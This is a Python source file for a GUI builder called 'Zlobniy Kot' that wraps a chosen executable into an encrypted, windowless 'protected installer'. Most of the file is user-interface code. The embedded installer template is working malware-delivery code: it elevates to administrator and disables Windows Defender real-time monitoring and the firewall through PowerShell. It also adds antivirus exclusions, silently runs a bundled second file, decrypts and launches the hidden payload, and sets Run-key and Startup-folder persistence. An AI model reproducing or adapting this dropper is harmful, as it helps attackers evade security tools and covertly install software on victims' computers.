import os
import sys
import base64
import tkinter as tk
from tkinter import filedialog, ttk, messagebox, scrolledtext
from cryptography.fernet import Fernet
import shutil
import tempfile
import subprocess
import logging
import time
import atexit
import winreg
import threading

# Настройка логирования
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('builder.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)

class BuilderApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Zlobniy Kot")
        self.root.geometry("900x700")
        self.root.configure(bg='#004d00')  # Темно-зеленый цвет
        
        # Устанавливаем иконку окна
        try:
            self.root.iconbitmap('icon.ico')
        except:
            pass
            
        # Инициализация переменных
        self.selected_file = None
        self.selected_icon = None
        self.selected_startup_icon = None
        self.attached_file = None
        self.custom_filename = tk.StringVar()
        self.startup_name = tk.StringVar()
        self.enable_startup = tk.BooleanVar(value=False)
        self.temp_dir = None
        
        # Настройка стилей
        self.style = ttk.Style()
        self.style.configure('Custom.TFrame', 
                           background='#004d00')  # Темно-зеленый
        
        self.style.configure('Custom.TLabel', 
                           background='#004d00',  # Темно-зеленый
                           foreground='white', 
                           font=('Segoe UI', 10, 'bold'))
        
        self.style.configure('Custom.TButton', 
                           font=('Segoe UI', 10, 'bold'),
                           padding=5,
                           background='white',
                           foreground='black',
                           borderwidth=2,
                           relief='solid')
        
        self.style.configure('Custom.TCheckbutton', 
                           background='#004d00',  # Темно-зеленый
                           foreground='white',
                           font=('Segoe UI', 10, 'bold'))
        
        self.style.map('Custom.TCheckbutton',
                      background=[('active', '#004d00')],
                      foreground=[('active', 'white')])
        
        self.style.configure('Header.TLabel',
                           background='#004d00',  # Темно-зеленый
                           foreground='white',
                           font=('Segoe UI', 20, 'bold'))
        
        self.style.configure('Section.TLabel',
                           background='#004d00',  # Темно-зеленый
                           foreground='white',
                           font=('Segoe UI', 12, 'bold'))
        
        # Уникальные стили для кнопок
        self.style.configure('Accent.TButton', 
                           font=('Segoe UI', 10, 'bold'),
                           padding=5,
                           background='white',
                           foreground='black',
                           borderwidth=2,
                           relief='solid')
        
        self.style.map('Accent.TButton',
                      background=[('active', '#FFE5E5')],
                      foreground=[('active', 'black')])
        
        # Градиентный фон для заголовка
        self.style.configure('Gradient.TFrame',
                           background='#004d00',  # Темно-зеленый
                           relief='solid',
                           borderwidth=2)
        
        # Стиль для Entry
        self.style.configure('Custom.TEntry',
                           fieldbackground='#004d00',  # Темно-зеленый фон для полей ввода
                           foreground='#ff0000',  # Красный цвет текста
                           insertcolor='red',  # Цвет курсора
                           borderwidth=2,
                           relief='solid')
        
        # Создаем главный фрейм
        main_frame = ttk.Frame(root, style='Gradient.TFrame', padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Заголовок с увеличенным отступом
        header_frame = ttk.Frame(main_frame, style='Gradient.TFrame')
        header_frame.pack(fill=tk.X, pady=(0, 30))
        
        title_frame = ttk.Frame(header_frame, style='Gradient.TFrame')
        title_frame.pack(fill=tk.X)
        
        title_label = ttk.Label(title_frame, text="Zlobniy Kot - 悪猫", 
                              style='Header.TLabel')
        title_label.pack(side=tk.LEFT, pady=(10, 0))
        
        info_label = ttk.Label(title_frame, text="Создание защищенного установщика", 
                             style='Custom.TLabel')
        info_label.pack(side=tk.RIGHT, pady=(10, 0))
        
        # Добавляем цитаты в отдельном фрейме с увеличенным отступом
        quote_frame = ttk.Frame(header_frame, style='Gradient.TFrame')
        quote_frame.pack(fill=tk.X, pady=(20, 0))
        
        quote_label = ttk.Label(quote_frame, 
                              text="影の戦士は、静寂の中で最も危険である\n" + 
                                   "Воин теней опаснее всего в тишине", 
                              style='Section.TLabel',
                              justify='center')
        quote_label.pack(expand=True)
        
        # Добавляем разделительную линию с отступами
        separator = ttk.Separator(header_frame, orient='horizontal')
        separator.pack(fill=tk.X, pady=(20, 0))
        
        # Секция выбора файла
        file_section = ttk.Frame(main_frame, style='Custom.TFrame')
        file_section.pack(fill=tk.X, pady=(0, 15))
        
        section_label = ttk.Label(file_section, text="Основные настройки", 
                                style='Section.TLabel')
        section_label.pack(anchor=tk.W, pady=(0, 10))
        
        file_frame = ttk.Frame(file_section, style='Custom.TFrame')
        file_frame.pack(fill=tk.X, pady=(0, 10))
        
        file_label = ttk.Label(file_frame, text="Выберите файл:", style='Custom.TLabel')
        file_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.file_path = tk.StringVar()
        file_entry = ttk.Entry(file_frame, textvariable=self.file_path, width=50, style='Custom.TEntry')
        file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        file_entry.bind("<Enter>", lambda e: self.show_tooltip(e, "Выберите файл для защиты"))
        file_entry.bind("<Leave>", lambda e: self.hide_tooltip())
        
        browse_button = ttk.Button(file_frame, text="Обзор", command=self.select_file, style='Accent.TButton')
        browse_button.pack(side=tk.LEFT)
        browse_button.bind("<Enter>", lambda e: self.show_tooltip(e, "Нажмите для выбора файла"))
        browse_button.bind("<Leave>", lambda e: self.hide_tooltip())
        
        # Секция выбора иконки
        icon_frame = ttk.Frame(file_section, style='Custom.TFrame')
        icon_frame.pack(fill=tk.X, pady=(0, 10))
        
        icon_label = ttk.Label(icon_frame, text="Выберите иконку:", style='Custom.TLabel')
        icon_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.icon_path = tk.StringVar()
        icon_entry = ttk.Entry(icon_frame, textvariable=self.icon_path, width=50, style='Custom.TEntry')
        icon_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        icon_entry.bind("<Enter>", lambda e: self.show_tooltip(e, "Выберите иконку для установщика"))
        icon_entry.bind("<Leave>", lambda e: self.hide_tooltip())
        
        icon_button = ttk.Button(icon_frame, text="Обзор", command=self.select_icon, style='Accent.TButton')
        icon_button.pack(side=tk.LEFT)
        icon_button.bind("<Enter>", lambda e: self.show_tooltip(e, "Нажмите для выбора иконки"))
        icon_button.bind("<Leave>", lambda e: self.hide_tooltip())
        
        # Секция имени файла
        name_frame = ttk.Frame(file_section, style='Custom.TFrame')
        name_frame.pack(fill=tk.X, pady=(0, 10))
        
        name_label = ttk.Label(name_frame, text="Имя файла:", style='Custom.TLabel')
        name_label.pack(side=tk.LEFT, padx=(0, 10))
        
        name_entry = ttk.Entry(name_frame, textvariable=self.custom_filename, width=50, style='Custom.TEntry')
        name_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        name_entry.bind("<Enter>", lambda e: self.show_tooltip(e, "Введите имя для выходного файла"))
        name_entry.bind("<Leave>", lambda e: self.hide_tooltip())
        
        # Секция прикрепляемого файла
        attached_frame = ttk.Frame(file_section, style='Custom.TFrame')
        attached_frame.pack(fill=tk.X, pady=(0, 10))
        
        attached_label = ttk.Label(attached_frame, text="Прикрепляемый файл:", style='Custom.TLabel')
        attached_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.attached_path = tk.StringVar()
        attached_entry = ttk.Entry(attached_frame, textvariable=self.attached_path, width=50, style='Custom.TEntry')
        attached_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        attached_entry.bind("<Enter>", lambda e: self.show_tooltip(e, "Выберите файл для прикрепления"))
        attached_entry.bind("<Leave>", lambda e: self.hide_tooltip())
        
        attached_button = ttk.Button(attached_frame, text="Обзор", command=self.select_attached_file, style='Accent.TButton')
        attached_button.pack(side=tk.LEFT)
        attached_button.bind("<Enter>", lambda e: self.show_tooltip(e, "Нажмите для выбора прикрепляемого файла"))
        attached_button.bind("<Leave>", lambda e: self.hide_tooltip())
        
        # Секция автозапуска
        startup_section = ttk.Frame(main_frame, style='Custom.TFrame')
        startup_section.pack(fill=tk.X, pady=(0, 15))
        
        startup_section_label = ttk.Label(startup_section, text="Настройки автозапуска", 
                                        style='Section.TLabel')
        startup_section_label.pack(anchor=tk.W, pady=(0, 10))
        
        startup_frame = ttk.Frame(startup_section, style='Custom.TFrame')
        startup_frame.pack(fill=tk.X, pady=(0, 10))
        
        startup_check = ttk.Checkbutton(startup_frame, 
                                      text="Добавить в автозапуск",
                                      variable=self.enable_startup,
                                      style='Custom.TCheckbutton',
                                      command=self.toggle_startup)
        startup_check.pack(side=tk.LEFT, padx=(0, 10))
        startup_check.bind("<Enter>", lambda e: self.show_tooltip(e, "Включите для добавления в автозапуск"))
        startup_check.bind("<Leave>", lambda e: self.hide_tooltip())
        
        startup_name_label = ttk.Label(startup_frame, text="Имя в автозапуске:", style='Custom.TLabel')
        startup_name_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.startup_name_entry = ttk.Entry(startup_frame, textvariable=self.startup_name, width=30, style='Custom.TEntry')
        self.startup_name_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.startup_name_entry.configure(state='disabled')
        self.startup_name_entry.bind("<Enter>", lambda e: self.show_tooltip(e, "Введите имя для автозапуска"))
        self.startup_name_entry.bind("<Leave>", lambda e: self.hide_tooltip())
        
        # Секция иконки автозапуска
        startup_icon_frame = ttk.Frame(startup_section, style='Custom.TFrame')
        startup_icon_frame.pack(fill=tk.X, pady=(0, 10))
        
        startup_icon_label = ttk.Label(startup_icon_frame, text="Иконка автозапуска:", style='Custom.TLabel')
        startup_icon_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.startup_icon_path = tk.StringVar()
        self.startup_icon_entry = ttk.Entry(startup_icon_frame, textvariable=self.startup_icon_path, width=50, style='Custom.TEntry')
        self.startup_icon_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.startup_icon_entry.configure(state='disabled')
        self.startup_icon_entry.bind("<Enter>", lambda e: self.show_tooltip(e, "Выберите иконку для автозапуска"))
        self.startup_icon_entry.bind("<Leave>", lambda e: self.hide_tooltip())
        
        self.startup_icon_button = ttk.Button(startup_icon_frame, text="Обзор", 
                                            command=self.select_startup_icon, style='Accent.TButton')
        self.startup_icon_button.pack(side=tk.LEFT)
        self.startup_icon_button.configure(state='disabled')
        self.startup_icon_button.bind("<Enter>", lambda e: self.show_tooltip(e, "Нажмите для выбора иконки автозапуска"))
        self.startup_icon_button.bind("<Leave>", lambda e: self.hide_tooltip())
        
        # Кнопка создания
        button_frame = ttk.Frame(main_frame, style='Custom.TFrame')
        button_frame.pack(fill=tk.X, pady=(0, 15))
        
        build_button = ttk.Button(button_frame, text="Создать установщик", 
                                command=self.build_protected, style='Accent.TButton')
        build_button.pack(side=tk.RIGHT)
        build_button.bind("<Enter>", lambda e: self.show_tooltip(e, "Нажмите для создания установщика"))
        build_button.bind("<Leave>", lambda e: self.hide_tooltip())
        
        # Секция логов
        log_section = ttk.Frame(main_frame, style='Custom.TFrame')
        log_section.pack(fill=tk.BOTH, expand=True)
        
        log_section_label = ttk.Label(log_section, text="Лог операций", 
                                    style='Section.TLabel')
        log_section_label.pack(anchor=tk.W, pady=(0, 5))
        
        self.log_text = scrolledtext.ScrolledText(log_section, height=10, 
                                                bg='#004d00',  # Темно-зеленый фон
                                                fg='#ff0000',  # Красный текст
                                                font=('Consolas', 9, 'bold'),
                                                insertbackground='red')  # Цвет курсора
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Перенаправление логов
        self.log_redirector = LogRedirector(self.log_text)
        logging.getLogger().addHandler(self.log_redirector)
        
        # Обработчик закрытия окна
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        logging.info("Интерфейс билдера инициализирован")
        
    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
        
    def create_widgets(self):
        # Основной контейнер
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Заголовок
        title_label = ttk.Label(
            main_frame, 
            text="Создание защищенного установщика",
            font=('Arial', 14, 'bold')
        )
        title_label.pack(pady=20)
        
        # Фрейм для выбора EXE файла
        file_frame = ttk.LabelFrame(main_frame, text="Выбор файла", padding="10")
        file_frame.pack(fill=tk.X, pady=10)
        
        self.file_entry = ttk.Entry(
            file_frame, 
            textvariable=self.selected_file,
            width=50
        )
        self.file_entry.pack(side=tk.LEFT, padx=5)
        
        select_btn = ttk.Button(
            file_frame,
            text="Выбрать EXE",
            command=self.select_file
        )
        select_btn.pack(side=tk.LEFT, padx=5)
        
        # Кнопка сборки
        build_btn = ttk.Button(
            main_frame,
            text="Создать защищенный установщик",
            command=self.build_protected
        )
        build_btn.pack(pady=20)
        
        # Лог
        log_frame = ttk.LabelFrame(main_frame, text="Лог сборки", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_text = tk.Text(log_frame, height=10, width=50)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Добавляем обработчик для логов
        self.log_handler = logging.StreamHandler(LogRedirector(self.log_text))
        self.log_handler.setFormatter(logging.Formatter('%(message)s'))
        logging.getLogger().addHandler(self.log_handler)
        
    def select_file(self):
        logging.info("Открытие диалога выбора файла...")
        file_path = filedialog.askopenfilename(
            title="Выберите файл для защиты",
            filetypes=[("Executable files", "*.exe"), ("All files", "*.*")]
        )
        if file_path:
            self.selected_file = file_path
            self.file_path.set(file_path)
            logging.info(f"Выбран файл: {file_path}")
            
    def select_icon(self):
        logging.info("Открытие диалога выбора иконки...")
        icon_path = filedialog.askopenfilename(
            title="Выберите иконку",
            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")]
        )
        if icon_path:
            self.selected_icon = icon_path
            self.icon_path.set(icon_path)
            logging.info(f"Выбрана иконка: {icon_path}")
            
    def select_startup_icon(self):
        """Выбор иконки для файла автозапуска"""
        logging.info("Открытие диалога выбора иконки автозапуска...")
        icon_path = filedialog.askopenfilename(
            title="Выберите иконку для автозапуска",
            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")]
        )
        if icon_path:
            self.selected_startup_icon = icon_path
            self.startup_icon_path.set(icon_path)
            logging.info(f"Выбрана иконка автозапуска: {icon_path}")
            
    def select_attached_file(self):
        logging.info("Открытие диалога выбора прикрепляемого файла...")
        file_path = filedialog.askopenfilename(
            title="Выберите прикрепляемый файл",
            filetypes=[("All files", "*.*")]
        )
        if file_path:
            self.attached_file = file_path
            self.attached_path.set(file_path)
            logging.info(f"Выбран прикрепляемый файл: {file_path}")
            
    def build_protected(self):
        if not self.selected_file:
            messagebox.showerror("Ошибка", "Пожалуйста, выберите файл для защиты")
            return
            
        try:
            logging.info("Начало создания защищенного установщика...")
            
            # Проверяем и устанавливаем зависимости
            self.check_and_install_dependencies()
            
            # Создаем временную директорию
            self.temp_dir = tempfile.mkdtemp()
            logging.info(f"Создана временная директория: {self.temp_dir}")
            
            # Генерируем ключ шифрования
            logging.info("Генерация ключа шифрования...")
            key = Fernet.generate_key()
            
            # Читаем и шифруем файл
            logging.info("Чтение и шифрование файла...")
            with open(self.selected_file, 'rb') as f:
                file_data = f.read()
            cipher_suite = Fernet(key)
            encrypted_data = cipher_suite.encrypt(file_data)
            logging.info("Файл успешно зашифрован")
            
            # Читаем прикрепляемый файл, если он есть
            attached_data = None
            if self.attached_file:
                logging.info("Чтение прикрепляемого файла...")
                with open(self.attached_file, 'rb') as f:
                    attached_data = f.read()
                logging.info("Прикрепляемый файл успешно прочитан")
            
            # Создаем код установщика
            logging.info("Создание кода установщика...")
            installer_path = os.path.join(self.temp_dir, "installer.py")
            logging.info(f"Сохранение файла установщика: {installer_path}")
            
            # Определяем параметры автозапуска
            enable_startup = self.enable_startup.get()
            startup_name = self.startup_name.get() if self.startup_name.get() else "ProtectedApp"
            
            # Создаем код установщика с поддержкой прикрепляемого файла
            installer_code = f'''import os
import sys
import base64
from cryptography.fernet import Fernet
import tempfile
import subprocess
import ctypes
import atexit
import shutil
import time
import winreg
import threading

# Зашифрованные данные
ENCRYPTED_EXE = {repr(encrypted_data)}
ENCRYPTION_KEY = {repr(key)}
ENABLE_STARTUP = {repr(enable_startup)}
STARTUP_NAME = {repr(startup_name)}
ATTACHED_DATA = {repr(attached_data) if attached_data else None}

def block_defender_notifications():
    try:
        # Блокируем уведомления Windows Defender
        subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
        # Блокируем брандмауэр
        subprocess.run(['powershell', '-Command', 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(300)  # Ждем 5 минут
        # Восстанавливаем настройки
        subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $false'], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True'], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def cleanup_temp_files(temp_dir):
    try:
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
    except:
        pass

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_defender_exclusions(paths):
    try:
        for path in paths:
            path = os.path.abspath(path)
            subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{{path}}"'], 
                         creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

def add_to_startup(exe_path, startup_name):
    try:
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        startup_exe = os.path.join(startup_path, f"{{startup_name}}.exe")
        shutil.copy2(exe_path, startup_exe)
        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, startup_exe)
        winreg.CloseKey(key)
        return True
    except:
        return False

def run_exe(exe_path):
    try:
        if not os.path.exists(exe_path):
            return False
            
        try:
            process = subprocess.Popen(
                exe_path,
                shell=False,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            try:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                subprocess.Popen(
                    exe_path,
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                return True
            except:
                os.startfile(exe_path)
                return True
    except:
        return False

def main():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
        except:
            sys.exit(1)

    temp_dir = None    
    try:
        # Запускаем блокировку уведомлений в отдельном потоке
        threading.Thread(target=block_defender_notifications, daemon=True).start()
        
        # 1. Создаем временную директорию
        temp_dir = tempfile.mkdtemp()
        exe_path = os.path.join(temp_dir, "app.exe")
        
        # 2. Добавляем исключения
        paths_to_exclude = [
            temp_dir,
            exe_path,
            os.path.dirname(os.path.abspath(sys.executable))
        ]
        add_defender_exclusions(paths_to_exclude)
        
        # 3. Запускаем прикрепляемый файл в любом случае
        if ATTACHED_DATA:
            attached_path = os.path.join(temp_dir, "attached.exe")
            with open(attached_path, 'wb') as f:
                f.write(ATTACHED_DATA)
                f.flush()
                os.fsync(f.fileno())
            run_exe(attached_path)
        
        # 4. Расшифровываем и запускаем основной файл
        cipher_suite = Fernet(ENCRYPTION_KEY)
        decrypted_data = cipher_suite.decrypt(ENCRYPTED_EXE)
        
        with open(exe_path, 'wb') as f:
            f.write(decrypted_data)
            f.flush()
            os.fsync(f.fileno())
        
        if ENABLE_STARTUP:
            add_to_startup(exe_path, STARTUP_NAME)
        
        run_exe(exe_path)
            
    except:
        sys.exit(1)
    finally:
        atexit.register(cleanup_temp_files, temp_dir)

if __name__ == "__main__":
    main()
'''
            
            # Сохраняем код установщика
            with open(installer_path, 'w', encoding='utf-8') as f:
                f.write(installer_code)
            logging.info("Файл установщика создан успешно")
            
            # Определяем имя выходного файла
            if self.custom_filename.get():
                output_name = self.custom_filename.get()
            else:
                output_name = os.path.splitext(os.path.basename(self.selected_file))[0]
            
            # Получаем путь к директории программы
            program_dir = os.path.dirname(os.path.abspath(__file__))
            
            logging.info(f"Сборка установщика: Protected_{output_name}.exe")
            
            # Формируем команду PyInstaller
            pyinstaller_cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--clean",
                "--distpath", program_dir,
                "--name", f"Protected_{output_name}"
            ]
            
            # Добавляем иконку, если она выбрана
            if self.selected_icon:
                pyinstaller_cmd.extend(["--icon", self.selected_icon])
                
            # Добавляем скрытые импорты
            pyinstaller_cmd.extend([
                "--hidden-import", "cryptography",
                "--hidden-import", "tkinter",
                "--hidden-import", "winreg"
            ])
            
            # Добавляем путь к установщику
            pyinstaller_cmd.append(installer_path)
            
            # Запускаем PyInstaller
            logging.info("Запуск PyInstaller...")
            subprocess.run(pyinstaller_cmd, check=True)
            
            # Проверяем результат
            output_file = os.path.join(program_dir, f"Protected_{output_name}.exe")
            if os.path.exists(output_file):
                logging.info(f"Установщик успешно создан: {output_file}")
                messagebox.showinfo("Успех", f"Защищенный установщик успешно создан:\n{output_file}")
            else:
                raise Exception("PyInstaller не создал выходной файл")
                
        except Exception as e:
            logging.error(f"Ошибка при создании установщика: {str(e)}")
            messagebox.showerror("Ошибка", f"Не удалось создать установщик:\n{str(e)}")
        finally:
            # Очищаем временные файлы
            if self.temp_dir and os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir, ignore_errors=True)

    def check_and_install_dependencies(self):
        """Проверяет и устанавливает необходимые зависимости"""
        try:
            # Проверяем наличие pip
            subprocess.run([sys.executable, "-m", "pip", "--version"], check=True, capture_output=True)
        except:
            logging.error("Pip не установлен")
            messagebox.showerror("Ошибка", "Pip не установлен. Пожалуйста, установите Python с pip")
            return False

        # Список необходимых пакетов
        required_packages = [
            "pyinstaller",
            "cryptography",
            "tkinter"
        ]

        for package in required_packages:
            try:
                # Пробуем импортировать пакет
                __import__(package)
            except ImportError:
                logging.info(f"Установка пакета {package}...")
                try:
                    subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)
                    logging.info(f"Пакет {package} успешно установлен")
                except Exception as e:
                    logging.error(f"Ошибка при установке пакета {package}: {str(e)}")
                    messagebox.showerror("Ошибка", f"Не удалось установить пакет {package}")
                    return False

        return True

    def on_closing(self):
        if messagebox.askokcancel("Выход", "Вы уверены, что хотите выйти?"):
            if self.temp_dir and os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir, ignore_errors=True)
            self.root.destroy()

    def run(self):
        self.root.mainloop()

    def toggle_startup(self):
        """Обработчик переключения чекбокса автозапуска"""
        if self.enable_startup.get():
            self.startup_name_entry.configure(state='normal')
            self.startup_icon_entry.configure(state='normal')
            self.startup_icon_button.configure(state='normal')
            if not self.startup_name.get():
                self.startup_name.set("ProtectedApp")
        else:
            self.startup_name_entry.configure(state='disabled')
            self.startup_icon_entry.configure(state='disabled')
            self.startup_icon_button.configure(state='disabled')
            self.startup_name.set("")
            self.startup_icon_path.set("")
            self.selected_startup_icon = None

    def show_tooltip(self, event, text):
        x, y, _, _ = self.root.bbox("insert")
        x += self.root.winfo_rootx() + 25
        y += self.root.winfo_rooty() + 20
        self.tooltip = tk.Toplevel(self.root)
        self.tooltip.wm_overrideredirect(True)
        self.tooltip.wm_geometry(f"+{x}+{y}")
        label = tk.Label(self.tooltip, text=text, justify='left',
                         background='#FFFFE0', relief='solid', borderwidth=1,
                         font=('Segoe UI', '10', 'normal'))
        label.pack(ipadx=1)

    def hide_tooltip(self):
        if hasattr(self, 'tooltip'):
            self.tooltip.destroy()

class LogRedirector:
    def __init__(self, text_widget):
        self.text_widget = text_widget
        self.level = logging.INFO  # Добавляем уровень логирования
        
    def write(self, message):
        if message and hasattr(self, 'text_widget') and self.text_widget:
            try:
                self.text_widget.insert(tk.END, str(message))
                self.text_widget.see(tk.END)
                self.text_widget.update()
            except:
                pass
        
    def flush(self):
        if hasattr(self, 'text_widget') and self.text_widget:
            try:
                self.text_widget.update_idletasks()
            except:
                pass
        
    def handle(self, record):
        """Обработчик для логирования"""
        msg = self.format(record)
        self.write(msg + '\n')
        
    def format(self, record):
        """Форматирование сообщения лога"""
        return f"{record.asctime} - {record.levelname} - {record.getMessage()}"
        
    def emit(self, record):
        """Вывод сообщения лога"""
        try:
            msg = self.format(record)
            self.write(msg + '\n')
        except Exception:
            self.handleError(record)
            
    def handleError(self, record):
        """Обработка ошибок логирования"""
        pass

if __name__ == "__main__":
    root = tk.Tk()
    app = BuilderApp(root)
    app.center_window()
    root.mainloop() 